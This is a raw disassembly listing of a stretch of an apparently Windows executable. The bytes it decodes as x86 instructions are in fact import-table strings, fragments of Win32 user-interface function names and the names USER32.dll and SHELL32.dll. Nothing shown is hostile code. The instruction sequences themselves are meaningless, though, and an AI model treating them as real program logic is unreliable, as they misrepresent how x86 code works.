  41e464:	outs   dx,DWORD PTR ds:[esi]
  41e465:	outs   dx,BYTE PTR ds:[esi]
  41e466:	imul   esp,DWORD PTR [ebx+0x0],0x49018500
  41e46d:	outs   dx,BYTE PTR ds:[esi]
  41e46e:	jae    0x41e4d5
  41e470:	jb     0x41e4e6
  41e472:	dec    ebp
  41e473:	outs   dx,BYTE PTR gs:[esi]
  41e475:	jne    0x41e4c0
  41e477:	je     0x41e4de
  41e479:	ins    DWORD PTR es:[edi],dx
  41e47a:	push   edi
  41e47b:	add    ah,ah
  41e47d:	add    DWORD PTR [edi+0x66],ecx
  41e480:	data16 jae 0x41e4e8
  41e483:	je     0x41e4d7
  41e485:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e48a:	scas   al,BYTE PTR es:[edi]
  41e48b:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e48f:	fs inc ebx
  41e491:	jne    0x41e505
  41e493:	jae    0x41e504
  41e495:	jb     0x41e4ee
  41e497:	add    BYTE PTR [ebx],al
  41e499:	add    BYTE PTR [ecx+0x64],al
  41e49c:	push   0x75
  41e49e:	jae    0x41e514
  41e4a0:	push   edi
  41e4a1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  41e4a8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  41e4ac:	add    BYTE PTR [eax],al
  41e4ae:	js     0x41e4b1
  41e4b0:	inc    edi
  41e4b1:	gs je  0x41e50b
  41e4b4:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e4bb:	js     0x41e531
  41e4bd:	push   edi
  41e4be:	add    BYTE PTR [eax],al
  41e4c0:	push   cs
  41e4c1:	add    DWORD PTR [edi+0x65],eax
  41e4c4:	je     0x41e50a
  41e4c6:	ins    BYTE PTR es:[edi],dx
  41e4c7:	addr16 inc ebx
  41e4c9:	je     0x41e53d
  41e4cb:	ins    BYTE PTR es:[edi],dx
  41e4cc:	dec    ecx
  41e4cd:	inc    esp
  41e4ce:	add    BYTE PTR [eax],al
  41e4d0:	mov    esp,0x6e695702
  41e4d5:	outs   dx,DWORD PTR fs:[esi]
  41e4d7:	ja     0x41e51f
  41e4d9:	jb     0x41e54a
  41e4db:	ins    DWORD PTR es:[edi],dx
  41e4dc:	push   eax
  41e4dd:	outs   dx,DWORD PTR ds:[esi]
  41e4de:	imul   ebp,DWORD PTR [esi+0x74],0x49018300
  41e4e5:	outs   dx,BYTE PTR ds:[esi]
  41e4e6:	jae    0x41e54d
  41e4e8:	jb     0x41e55e
  41e4ea:	dec    ebp
  41e4eb:	outs   dx,BYTE PTR gs:[esi]
  41e4ed:	jne    0x41e530
  41e4ef:	add    BYTE PTR [esi+0x73795302],al
  41e4f5:	je     0x41e55c
  41e4f7:	ins    DWORD PTR es:[edi],dx
  41e4f8:	push   eax
  41e4f9:	popa   
  41e4fa:	jb     0x41e55d
  41e4fc:	ins    DWORD PTR es:[edi],dx
  41e4fd:	gs je  0x41e565
  41e500:	jb     0x41e575
  41e502:	dec    ecx
  41e503:	outs   dx,BYTE PTR ds:[esi]
  41e504:	outs   dx,WORD PTR ds:[esi]
  41e506:	push   edi
  41e507:	add    BYTE PTR [edx],dh
  41e509:	add    DWORD PTR [edi+0x65],eax
  41e50c:	je     0x41e55b
  41e50e:	outs   dx,BYTE PTR gs:[esi]
  41e510:	jne    0x41e55b
  41e512:	je     0x41e579
  41e514:	ins    DWORD PTR es:[edi],dx
  41e515:	inc    ebx
  41e516:	outs   dx,DWORD PTR ds:[esi]
  41e517:	jne    0x41e587
  41e519:	je     0x41e51b
  41e51b:	add    BYTE PTR [ecx+0x4b6b5602],dh
  41e521:	gs jns 0x41e577
  41e524:	arpl   WORD PTR [ecx+0x6e],sp
  41e527:	push   edi
  41e528:	add    BYTE PTR [eax],al
  41e52a:	add    eax,DWORD PTR [edx]
  41e52c:	push   edx
  41e52d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e536:	popa   
  41e537:	jae    0x41e5ac
  41e539:	inc    ebp
  41e53a:	js     0x41e57d
  41e53c:	add    BYTE PTR [eax],al
  41e53e:	ret    
  41e53f:	add    BYTE PTR [ebp+0x6e],al
  41e542:	fs inc esp
  41e544:	imul   esp,DWORD PTR [ecx+0x6c],0x4600676f
  41e54b:	add    BYTE PTR [ebx+0x6c],al
  41e54e:	outs   dx,DWORD PTR ds:[esi]
  41e54f:	jae    0x41e5b6
  41e551:	inc    esp
  41e552:	gs jae 0x41e5c0
  41e555:	je     0x41e5c6
  41e557:	jo     0x41e559
  41e559:	add    BYTE PTR [eax+0x44734901],bl
  41e55f:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  41e566:	jae    0x41e5db
  41e568:	popa   
  41e569:	addr16 gs push edi
  41e56c:	add    BYTE PTR [eax],al
  41e56e:	out    0x1,eax
  41e570:	dec    edi
  41e571:	jo     0x41e5d8
  41e573:	outs   dx,BYTE PTR ds:[esi]
  41e574:	inc    esp
  41e575:	gs jae 0x41e5e3
  41e578:	je     0x41e5e9
  41e57a:	jo     0x41e5d3
  41e57c:	add    BYTE PTR [eax],al
  41e57e:	and    BYTE PTR [edx],al
  41e580:	push   ebx
  41e581:	arpl   WORD PTR [edx+0x6f],si
  41e584:	ins    BYTE PTR es:[edi],dx
  41e585:	ins    BYTE PTR es:[edi],dx
  41e586:	push   edi
  41e587:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e58e:	add    BYTE PTR [eax],al
  41e590:	mov    al,ds:0x57734901
  41e595:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e59c:	xor    eax,0x61684300
  41e5a1:	jb     0x41e5f7
  41e5a3:	outs   dx,DWORD PTR ds:[esi]
  41e5a4:	dec    edi
  41e5a5:	gs ins DWORD PTR es:[edi],dx
  41e5a7:	push   edi
  41e5a8:	add    BYTE PTR [eax],al
  41e5aa:	xor    al,BYTE PTR [edx]
  41e5ac:	push   ebx
  41e5ad:	gs je  0x41e5f3
  41e5b0:	popa   
  41e5b1:	jb     0x41e618
  41e5b3:	je     0x41e605
  41e5b5:	outs   dx,DWORD PTR ds:[esi]
  41e5b6:	jae    0x41e5b8
  41e5b8:	daa    
  41e5b9:	add    DWORD PTR [edi+0x65],eax
  41e5bc:	je     0x41e609
  41e5be:	gs jns 0x41e623
  41e5c1:	outs   dx,DWORD PTR ds:[esi]
  41e5c2:	popa   
  41e5c3:	jb     0x41e629
  41e5c5:	push   esp
  41e5c6:	jns    0x41e638
  41e5c8:	gs add bh,ch
  41e5cb:	add    DWORD PTR [eax+0x65],edx
  41e5ce:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  41e5d3:	jae    0x41e636
  41e5d5:	addr16 gs push edi
  41e5d8:	add    BYTE PTR [eax],al
  41e5da:	push   0x74654701
  41e5df:	push   edi
  41e5e0:	imul   ebp,DWORD PTR [esi+0x64],0x5900776f
  41e5e7:	add    BYTE PTR [ebx+0x72],al
  41e5ea:	gs popa 
  41e5ec:	je     0x41e653
  41e5ee:	inc    esp
  41e5ef:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  41e5f6:	jb     0x41e659
  41e5f8:	ins    DWORD PTR es:[edi],dx
  41e5f9:	push   edi
  41e5fa:	add    BYTE PTR [eax],al
  41e5fc:	je     0x41e600
  41e5fe:	push   ebx
  41e5ff:	gs je  0x41e659
  41e602:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e609:	js     0x41e67f
  41e60b:	push   edi
  41e60c:	add    BYTE PTR [eax],al
  41e60e:	xchg   ebx,eax
  41e60f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e613:	je     0x41e687
  41e615:	outs   dx,DWORD PTR ds:[esi]
  41e616:	jns    0x41e659
  41e618:	arpl   WORD PTR [ebx+0x65],sp
  41e61b:	ins    BYTE PTR es:[edi],dx
  41e61c:	gs jb  0x41e680
  41e61f:	je     0x41e690
  41e621:	jb     0x41e677
  41e623:	popa   
  41e624:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e628:	cmc    
  41e629:	add    BYTE PTR [edi+0x65],al
  41e62c:	je     0x41e671
  41e62e:	ins    BYTE PTR es:[edi],dx
  41e62f:	popa   
  41e630:	jae    0x41e6a5
  41e632:	dec    ecx
  41e633:	outs   dx,BYTE PTR ds:[esi]
  41e634:	outs   dx,WORD PTR ds:[esi]
  41e636:	inc    ebp
  41e637:	js     0x41e67a
  41e639:	add    BYTE PTR [ebp+0x1],ch
  41e63c:	inc    edi
  41e63d:	gs je  0x41e697
  41e640:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  41e647:	outs   dx,BYTE PTR ds:[esi]
  41e648:	addr16 push edi
  41e64a:	add    BYTE PTR [eax],al
  41e64c:	fld    QWORD PTR [eax]
  41e64e:	inc    ebp
  41e64f:	jno    0x41e6c6
  41e651:	popa   
  41e652:	ins    BYTE PTR es:[edi],dx
  41e653:	push   edx
  41e654:	arpl   WORD PTR gs:[eax+eax*1+0x5b],si
  41e659:	add    dl,BYTE PTR [ebx+0x65]
  41e65c:	je     0x41e6b1
  41e65e:	arpl   WORD PTR [edx+0x6f],si
  41e661:	ins    BYTE PTR es:[edi],dx
  41e662:	ins    BYTE PTR es:[edi],dx
  41e663:	push   eax
  41e664:	outs   dx,DWORD PTR ds:[esi]
  41e665:	jae    0x41e667
  41e667:	add    BYTE PTR [edx+0x57734901],ah
  41e66d:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  41e674:	imul   esp,DWORD PTR [ebx+0x6f],0xa6006564
  41e67b:	add    DWORD PTR [ebx+0x69],ecx
  41e67e:	ins    BYTE PTR es:[edi],dx
  41e67f:	ins    BYTE PTR es:[edi],dx
  41e680:	push   esp
  41e681:	imul   ebp,DWORD PTR [ebp+0x65],0x1810072
  41e688:	dec    ecx
  41e689:	outs   dx,BYTE PTR ds:[esi]
  41e68a:	push   ebx
  41e68b:	outs   dx,BYTE PTR gs:[esi]
  41e68d:	fs dec ebp
  41e68f:	gs jae 0x41e705
  41e692:	popa   
  41e693:	addr16 gs inc ebp
  41e696:	js     0x41e698
  41e698:	pop    ebx
  41e699:	add    BYTE PTR [ebx+0x72],al
  41e69c:	gs popa 
  41e69e:	je     0x41e705
  41e6a0:	dec    ecx
  41e6a1:	arpl   WORD PTR [edi+0x6e],bp
  41e6a4:	inc    esi
  41e6a5:	jb     0x41e716
  41e6a7:	ins    DWORD PTR es:[edi],dx
  41e6a8:	push   edx
  41e6a9:	gs jae 0x41e71b
  41e6ac:	jne    0x41e720
  41e6ae:	arpl   WORD PTR [ebp+0x0],sp
  41e6b1:	add    BYTE PTR [edx+0x0],cl
  41e6b4:	inc    ebx
  41e6b5:	outs   dx,DWORD PTR ds:[esi]
  41e6b6:	jo     0x41e731
  41e6b8:	inc    ecx
  41e6b9:	arpl   WORD PTR [ebx+0x65],sp
  41e6bc:	ins    BYTE PTR es:[edi],dx
  41e6bd:	gs jb  0x41e721
  41e6c0:	je     0x41e731
  41e6c2:	jb     0x41e718
  41e6c4:	popa   
  41e6c5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  41e6c9:	add    BYTE PTR [esi+0x66654400],cl
  41e6cf:	push   edi
  41e6d0:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41e6d7:	outs   dx,DWORD PTR ds:[esi]
  41e6d8:	arpl   WORD PTR [ecx+0x0],ax
  41e6db:	add    BYTE PTR [ebp+0x79656b02],bh
  41e6e1:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  41e6e5:	jbe    0x41e74c
  41e6e7:	outs   dx,BYTE PTR ds:[esi]
  41e6e8:	je     0x41e6ea
  41e6ea:	fadd   QWORD PTR [eax]
  41e6ec:	inc    ebp
  41e6ed:	outs   dx,BYTE PTR ds:[esi]
  41e6ee:	jne    0x41e75d
  41e6f0:	push   edi
  41e6f1:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e6f8:	adc    eax,DWORD PTR [ecx]
  41e6fa:	inc    edi
  41e6fb:	gs je  0x41e742
  41e6fe:	outs   dx,DWORD PTR ds:[esi]
  41e6ff:	jne    0x41e763
  41e701:	ins    BYTE PTR es:[edi],dx
  41e702:	gs inc ebx
  41e704:	ins    BYTE PTR es:[edi],dx
  41e705:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  41e70c:	add    BYTE PTR [eax],al
  41e70e:	cwde   
  41e70f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e713:	je     0x41e787
  41e715:	outs   dx,DWORD PTR ds:[esi]
  41e716:	jns    0x41e76f
  41e718:	imul   ebp,DWORD PTR [esi+0x64],0x2e00776f
  41e71f:	add    BYTE PTR [ebx+0x68],al
  41e722:	popa   
  41e723:	jb     0x41e775
  41e725:	jb     0x41e78c
  41e727:	jbe    0x41e76a
  41e729:	add    BYTE PTR [esi],ah
  41e72b:	add    dl,BYTE PTR [ebx+0x65]
  41e72e:	outs   dx,BYTE PTR ds:[esi]
  41e72f:	fs dec ebp
  41e731:	gs jae 0x41e7a7
  41e734:	popa   
  41e735:	addr16 gs inc ecx
  41e738:	add    BYTE PTR [eax],al
  41e73a:	mov    DWORD PTR [eax],eax
  41e73c:	inc    esp
  41e73d:	gs inc si
  41e740:	jb     0x41e7a3
  41e742:	ins    DWORD PTR es:[edi],dx
  41e743:	gs push eax
  41e745:	jb     0x41e7b6
  41e747:	arpl   WORD PTR [ecx+0x0],ax
  41e74a:	or     al,BYTE PTR [edx]
  41e74c:	push   edx
  41e74d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  41e756:	je     0x41e7a3
  41e758:	gs jns 0x41e75b
  41e75b:	add    BYTE PTR [eax],bh
  41e75d:	add    dl,BYTE PTR [ebx+0x65]
  41e760:	je     0x41e7a5
  41e762:	jne    0x41e7d6
  41e764:	jae    0x41e7d5
  41e766:	jb     0x41e768
  41e768:	push   0x1
  41e76a:	inc    edi
  41e76b:	gs je  0x41e7c5
  41e76e:	imul   ebp,DWORD PTR [esi+0x64],0x4344776f
  41e775:	add    BYTE PTR ds:0x74655302,bh
  41e77b:	inc    esp
  41e77c:	ins    BYTE PTR es:[edi],dx
  41e77d:	addr16 dec ecx
  41e77f:	je     0x41e7e6
  41e781:	ins    DWORD PTR es:[edi],dx
  41e782:	dec    ecx
  41e783:	outs   dx,BYTE PTR ds:[esi]
  41e784:	je     0x41e786
  41e786:	sbb    eax,0x73614300
  41e78b:	arpl   WORD PTR [ecx+0x64],sp
  41e78e:	gs push edi
  41e790:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e797:	add    BYTE PTR [ebx],dh
  41e799:	add    DWORD PTR [edi+0x65],eax
  41e79c:	je     0x41e7eb
  41e79e:	outs   dx,BYTE PTR gs:[esi]
  41e7a0:	jne    0x41e7eb
  41e7a2:	je     0x41e809
  41e7a4:	ins    DWORD PTR es:[edi],dx
  41e7a5:	dec    ecx
  41e7a6:	inc    esp
  41e7a7:	add    BYTE PTR [eax+eax*1+0x6c616944],bl
  41e7ae:	outs   dx,DWORD PTR ds:[esi]
  41e7af:	addr16 inc edx
  41e7b1:	outs   dx,DWORD PTR ds:[esi]
  41e7b2:	js     0x41e804
  41e7b4:	popa   
  41e7b5:	jb     0x41e818
  41e7b7:	ins    DWORD PTR es:[edi],dx
  41e7b8:	inc    ecx
  41e7b9:	add    BYTE PTR [edx+eax*1+0x74697753],al
  41e7c0:	arpl   WORD PTR [eax+0x54],bp
  41e7c3:	outs   dx,DWORD PTR ds:[esi]
  41e7c4:	push   esp
  41e7c5:	push   0x69577369
  41e7ca:	outs   dx,BYTE PTR ds:[esi]
  41e7cb:	outs   dx,DWORD PTR fs:[esi]
  41e7cd:	ja     0x41e7cf
  41e7cf:	add    BYTE PTR [eax+eax*1],bh
  41e7d2:	inc    ebx
  41e7d3:	push   0x4d6b6365
  41e7d8:	outs   dx,BYTE PTR gs:[esi]
  41e7da:	jne    0x41e82e
  41e7dc:	popa   
  41e7dd:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  41e7e5:	add    ah,al
  41e7e7:	add    DWORD PTR [ebp+0x61],ecx
  41e7ea:	jo     0x41e830
  41e7ec:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  41e7f3:	arpl   WORD PTR [eax+eax*1-0x5],si
  41e7f7:	add    DWORD PTR [eax+0x74],edx
  41e7fa:	dec    ecx
  41e7fb:	outs   dx,BYTE PTR ds:[esi]
  41e7fc:	push   edx
  41e7fd:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e802:	cdq    
  41e803:	add    DWORD PTR [ecx+0x73],ecx
  41e806:	inc    esp
  41e807:	ins    BYTE PTR es:[edi],dx
  41e808:	addr16 inc edx
  41e80a:	jne    0x41e880
  41e80c:	je     0x41e87d
  41e80e:	outs   dx,BYTE PTR ds:[esi]
  41e80f:	inc    ebx
  41e810:	push   0x656b6365
  41e815:	add    BYTE PTR fs:[eax],al
  41e818:	mov    edi,0x70737702
  41e81d:	jb     0x41e888
  41e81f:	outs   dx,BYTE PTR ds:[esi]
  41e820:	je     0x41e888
  41e822:	inc    ecx
  41e823:	add    BYTE PTR [ebx+0x1],bl
  41e826:	inc    edi
  41e827:	gs je  0x41e87d
  41e82a:	jns    0x41e89f
  41e82c:	je     0x41e893
  41e82e:	ins    DWORD PTR es:[edi],dx
  41e82f:	dec    ebp
  41e830:	outs   dx,BYTE PTR gs:[esi]
  41e832:	jne    0x41e834
  41e834:	add    al,0x2
  41e836:	push   edx
  41e837:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e840:	popa   
  41e841:	jae    0x41e8b6
  41e843:	inc    ebp
  41e844:	js     0x41e89d
  41e846:	add    BYTE PTR [eax],al
  41e848:	pusha  
  41e849:	add    BYTE PTR [ebx+0x72],al
  41e84c:	gs popa 
  41e84e:	je     0x41e8b5
  41e850:	dec    ebp
  41e851:	outs   dx,BYTE PTR gs:[esi]
  41e853:	jne    0x41e855
  41e855:	add    al,bh
  41e857:	add    BYTE PTR [edi+0x65],al
  41e85a:	je     0x41e89f
  41e85c:	ins    BYTE PTR es:[edi],dx
  41e85d:	popa   
  41e85e:	jae    0x41e8d3
  41e860:	dec    esp
  41e861:	outs   dx,DWORD PTR ds:[esi]
  41e862:	outs   dx,BYTE PTR ds:[esi]
  41e863:	addr16 inc ecx
  41e865:	add    BYTE PTR ds:0x74654701,dh
  41e86b:	dec    ebp
  41e86c:	outs   dx,BYTE PTR gs:[esi]
  41e86e:	jne    0x41e8b9
  41e870:	je     0x41e8d7
  41e872:	ins    DWORD PTR es:[edi],dx
  41e873:	dec    ecx
  41e874:	outs   dx,BYTE PTR ds:[esi]
  41e875:	outs   dx,WORD PTR ds:[esi]
  41e877:	push   edi
  41e878:	add    BYTE PTR [eax],al
  41e87a:	mov    ecx,0x616f4c01
  41e87f:	fs dec ebp
  41e881:	outs   dx,BYTE PTR gs:[esi]
  41e883:	jne    0x41e8dc
  41e885:	add    BYTE PTR [edx+0x1],ah
  41e888:	inc    edi
  41e889:	gs je  0x41e8e0
  41e88c:	outs   dx,DWORD PTR ds:[esi]
  41e88d:	jo     0x41e8e6
  41e88f:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e896:	dec    ebx
  41e897:	add    DWORD PTR [edi+0x65],eax
  41e89a:	je     0x41e8ec
  41e89c:	jb     0x41e90d
  41e89e:	jo     0x41e8f7
  41e8a0:	add    BYTE PTR [eax],al
  41e8a2:	cmp    al,BYTE PTR [edx]
  41e8a4:	push   ebx
  41e8a5:	gs je  0x41e8eb
  41e8a8:	jne    0x41e91c
  41e8aa:	jae    0x41e91b
  41e8ac:	jb     0x41e8fe
  41e8ae:	outs   dx,DWORD PTR ds:[esi]
  41e8af:	jae    0x41e8b1
  41e8b1:	add    bh,al
  41e8b3:	add    DWORD PTR [ebp+0x61],ecx
  41e8b6:	jo     0x41e90e
  41e8b8:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  41e8bf:	gs jns 0x41e907
  41e8c2:	js     0x41e91b
  41e8c4:	add    BYTE PTR [eax],al
  41e8c6:	jp     0x41e8ca
  41e8c8:	push   ebx
  41e8c9:	push   0x6143776f
  41e8ce:	jb     0x41e935
  41e8d0:	je     0x41e8d2
  41e8d2:	add    eax,0x67655202
  41e8d7:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  41e8de:	popa   
  41e8df:	jae    0x41e954
  41e8e1:	push   edi
  41e8e2:	add    BYTE PTR [eax],al
  41e8e4:	scas   eax,DWORD PTR es:[edi]
  41e8e5:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e8e9:	fs dec ecx
  41e8eb:	arpl   WORD PTR [edi+0x6e],bp
  41e8ee:	inc    ecx
  41e8ef:	add    bl,dh
  41e8f1:	add    BYTE PTR [edi+0x65],al
  41e8f4:	je     0x41e939
  41e8f6:	popa   
  41e8f7:	jb     0x41e95e
  41e8f9:	je     0x41e94b
  41e8fb:	outs   dx,DWORD PTR ds:[esi]
  41e8fc:	jae    0x41e8fe
  41e8fe:	jnp    0x41e902
  41e900:	push   ebx
  41e901:	push   0x7543776f
  41e906:	jb     0x41e97b
  41e908:	outs   dx,DWORD PTR ds:[esi]
  41e909:	jb     0x41e90b
  41e90b:	add    BYTE PTR [eax+0x1],bl
  41e90e:	inc    edi
  41e90f:	gs je  0x41e965
  41e912:	jne    0x41e976
  41e914:	dec    ebp
  41e915:	outs   dx,BYTE PTR gs:[esi]
  41e917:	jne    0x41e919
  41e919:	add    cl,al
  41e91b:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  41e91f:	imul   esi,DWORD PTR [ebp+0x70],0x49
  41e923:	arpl   WORD PTR [edi+0x6e],bp
  41e926:	dec    ecx
  41e927:	fs inc esi
  41e929:	jb     0x41e99a
  41e92b:	ins    DWORD PTR es:[edi],dx
  41e92c:	inc    esp
  41e92d:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41e934:	jns    0x41e936
  41e936:	push   ebp
  41e937:	push   ebx
  41e938:	inc    ebp
  41e939:	push   edx
  41e93a:	xor    esi,DWORD PTR [edx]
  41e93c:	cs fs ins BYTE PTR es:[edi],dx
  41e93f:	ins    BYTE PTR es:[edi],dx
  41e940:	add    BYTE PTR [eax],al
  41e942:	push   ebx
  41e943:	dec    eax
  41e944:	inc    ebp
  41e945:	dec    esp
  41e946:	dec    esp
  41e947:	xor    esi,DWORD PTR [edx]
  41e949:	cs fs ins BYTE PTR es:[edi],dx
  41e94c:	ins    BYTE PTR es:[edi],dx
  41e94d:	add    BYTE PTR [ebx+0x70],dh
  41e950:	push   ecx
  41e951:	dec    edx
  41e952:	push   0x47
  41e954:	jne    0x41e99c
  41e956:	jns    0x41e99f
  41e958:	push   edi
  41e959:	push   esi
  41e95a:	inc    edi
  41e95b:	ins    BYTE PTR es:[edi],dx
  41e95c:	inc    ecx
  41e95d:	inc    edi
  41e95e:	push   ds
  41e95f:	in     eax,dx
  41e960:	inc    ecx
  41e961:	add    BYTE PTR [esi],ah
  41e963:	in     eax,dx
  41e964:	inc    ecx
  41e965:	add    BYTE PTR [esi-0x10ffbe15],ah
  41e96b:	or     esi,DWORD PTR [edx+0x324f7d0e]
  41e971:	dec    edi
  41e972:	addr16 dec edi
  41e974:	xor    DWORD PTR [edi+0x4f],ecx
  41e977:	dec    edi
  41e978:	cmp    al,0x4f
  41e97a:	jp     0x41e9cb
  41e97c:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e97f:	dec    edi
  41e980:	es dec edi
  41e982:	jae    0x41e9d3
  41e984:	and    eax,0x224f324f
  41e989:	dec    edi
  41e98a:	push   ds
  41e98b:	push   edx
  41e98c:	pop    ds
  41e98d:	push   ebx
  41e98e:	cmp    eax,0x324f7d4f
  41e993:	dec    edi
  41e994:	addr16 dec edi
  41e996:	xor    DWORD PTR [edi+0x4f],ecx
  41e999:	dec    edi
  41e99a:	cmp    al,0x4f
  41e99c:	jp     0x41e9ed
  41e99e:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e9a1:	dec    edi
  41e9a2:	es dec edi
  41e9a4:	ins    DWORD PTR es:[edi],dx
  41e9a5:	dec    edi
  41e9a6:	and    eax,0x224f324f
  41e9ab:	dec    edi
  41e9ac:	push   ds
  41e9ad:	bound  ebx,QWORD PTR [edi]
  41e9af:	arpl   WORD PTR ds:0x324f7d4f,di
  41e9b5:	dec    edi
  41e9b6:	bound  ecx,QWORD PTR [edi+0x31]
  41e9b9:	dec    edi
  41e9ba:	jae    0x41ea0b
  41e9bc:	cmp    eax,0x384f404f
  41e9c1:	dec    edi
  41e9c2:	xor    cl,BYTE PTR [edi+0x24]
  41e9c5:	dec    edi
  41e9c6:	push   ds
  41e9c7:	jb     0x41e9e8
  41e9c9:	jae    0x41e9da
  41e9cb:	or     DWORD PTR [eax+eax*4],0x7c
  41e9cf:	nop
  41e9d0:	jge    0x41e963
  41e9d2:	aas    
  41e9d3:	dec    edi
  41e9d4:	dec    di
  41e9d6:	xor    cl,BYTE PTR [edi+0x66]
  41e9d9:	dec    edi
  41e9da:	ds dec edi
  41e9dc:	inc    eax
  41e9dd:	dec    edi
  41e9de:	cmp    eax,0x394f734f
  41e9e3:	dec    edi
  41e9e4:	xor    cl,BYTE PTR [edi+0x26]
  41e9e7:	dec    edi
  41e9e8:	push   ds
  41e9e9:	sbb    BYTE PTR [edi],0x83
  41e9ec:	setae  BYTE PTR [eax+edx*4]
  41e9f0:	jl     0x41e992
  41e9f2:	jge    0x41e995
  41e9f4:	aas    
  41e9f5:	dec    edi
  41e9f6:	dec    di
  41e9f8:	xor    cl,BYTE PTR [edi+0x66]
  41e9fb:	dec    edi
  41e9fc:	ds dec edi
  41e9fe:	inc    eax
  41e9ff:	dec    edi
  41ea00:	cmp    eax,0x394f6d4f
  41ea05:	dec    edi
  41ea06:	xor    cl,BYTE PTR [edi+0x26]
  41ea09:	dec    edi
  41ea0a:	push   ds
  41ea0b:	xchg   edx,eax
  41ea0c:	pop    ds
  41ea0d:	xchg   ebx,eax
  41ea0e:	bt     DWORD PTR [eax+eiz*4],ecx
  41ea12:	jl     0x41e9c4
  41ea14:	jge    0x41e9c7
  41ea16:	aas    
  41ea17:	dec    edi
  41ea18:	ins    BYTE PTR es:[edi],dx
  41ea19:	dec    edi
  41ea1a:	xor    cl,BYTE PTR [edi+0x4e]
  41ea1d:	dec    edi
  41ea1e:	xor    DWORD PTR [edi+0x73],ecx
  41ea21:	dec    edi
  41ea22:	cmp    eax,0x384f454f
  41ea27:	dec    edi
  41ea28:	xor    cl,BYTE PTR [edi+0x26]
  41ea2b:	dec    edi
  41ea2c:	push   ds
  41ea2d:	mov    ds:0xb30fa31f,al
  41ea32:	or     al,0xb0
  41ea34:	jl     0x41e9f6
  41ea36:	jge    0x41e9f9
  41ea38:	aas    
  41ea39:	dec    edi
  41ea3a:	ins    BYTE PTR es:[edi],dx
  41ea3b:	dec    edi
  41ea3c:	xor    cl,BYTE PTR [edi+0x4e]
  41ea3f:	dec    edi
  41ea40:	xor    DWORD PTR [edi+0x7c],ecx
  41ea43:	dec    edi
  41ea44:	cmp    eax,0x3b4f5f4f
  41ea49:	dec    edi
  41ea4a:	xor    cl,BYTE PTR [edi+0x39]
  41ea4d:	dec    edi
  41ea4e:	push   ds
  41ea4f:	mov    dl,0x1f
  41ea51:	mov    bl,0xf
  41ea53:	ret    
  41ea54:	or     al,0xc0
  41ea56:	jl     0x41ea28
  41ea58:	jge    0x41ea2b
  41ea5a:	aas    
  41ea5b:	dec    edi
  41ea5c:	ins    BYTE PTR es:[edi],dx
  41ea5d:	dec    edi
  41ea5e:	xor    cl,BYTE PTR [edi+0x4e]
  41ea61:	dec    edi
  41ea62:	xor    DWORD PTR [edi+0x62],ecx
  41ea65:	dec    edi
  41ea66:	cmp    eax,0x384f4e4f
  41ea6b:	dec    edi
  41ea6c:	xor    cl,BYTE PTR [edi+0x24]
  41ea6f:	dec    edi
  41ea70:	push   ds
  41ea71:	ret    0xc31f
  41ea74:	psrlq  mm1,QWORD PTR [eax+edx*8]
  41ea78:	jl     0x41ea5a
  41ea7a:	jge    0x41ea5d
  41ea7c:	aas    
  41ea7d:	dec    edi
  41ea7e:	ins    BYTE PTR es:[edi],dx
  41ea7f:	dec    edi
  41ea80:	xor    cl,BYTE PTR [edi+0x4e]
  41ea83:	dec    edi
  41ea84:	xor    DWORD PTR [edi+0x63],ecx
  41ea87:	dec    edi
  41ea88:	cmp    eax,0x384f404f
  41ea8d:	dec    edi
  41ea8e:	xor    cl,BYTE PTR [edi+0x26]
  41ea91:	dec    edi
  41ea92:	push   ds
  41ea93:	rcr    BYTE PTR [edi],cl
  41ea95:	ror    DWORD PTR [edi],cl
  41ea97:	jecxz  0x41eaa5
  41ea99:	loopne 0x41eb17
  41ea9b:	lock jge 0x41ea8f
  41ea9e:	aas    
  41ea9f:	dec    edi
  41eaa0:	popa   
  41eaa1:	dec    edi
  41eaa2:	xor    cl,BYTE PTR [edi+0x5f]
  41eaa5:	dec    edi
  41eaa6:	xor    DWORD PTR [edi+0x42],ecx
  41eaa9:	dec    edi
  41eaaa:	ds dec edi
  41eaac:	xor    cl,BYTE PTR [edi+0x3f]
  41eaaf:	dec    edi
  41eab0:	push   ds
  41eab1:	loop   0x41ead2
  41eab3:	jecxz  0x41eac4
  41eab5:	repz or al,0xf0
  41eab8:	jl     0x41eaba
  41eaba:	jge    0x41eabd
  41eabc:	jl     0x41eace
  41eabe:	jge    0x41ead1
  41eac0:	ds dec edi
  41eac2:	jg     0x41eb13
  41eac4:	xor    cl,BYTE PTR [edi+0x5b]
  41eac7:	dec    edi
